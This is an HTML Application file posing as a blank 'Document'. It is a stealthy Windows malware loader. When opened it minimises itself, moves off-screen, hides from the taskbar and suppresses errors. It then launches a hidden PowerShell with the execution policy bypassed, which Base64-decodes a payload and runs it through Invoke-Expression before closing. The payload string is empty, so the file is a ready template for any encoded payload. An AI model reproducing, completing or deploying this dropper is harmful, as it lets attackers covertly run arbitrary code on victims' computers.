<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta charset="utf-8"/>
<title>Document</title>
<HTA:APPLICATION ID="a" APPLICATIONNAME="Document" BORDER="none" CAPTION="no" SHOWINTASKBAR="no" SCROLL="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize"/>
<script language="VBScript">
Sub Window_OnLoad
  On Error Resume Next
  window.resizeTo 0, 0
  window.moveTo -32000, -32000
  Dim sh, p, cmd
  Set sh = CreateObject("WScript.Shell")
  p = ""
  cmd = "powershell -NoP -EP Bypass -W Hidden -C ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" & p & "'))|iex"""
  sh.Run cmd, 0, False
  window.close
End Sub
</script>
</head>
<body></body>
</html>
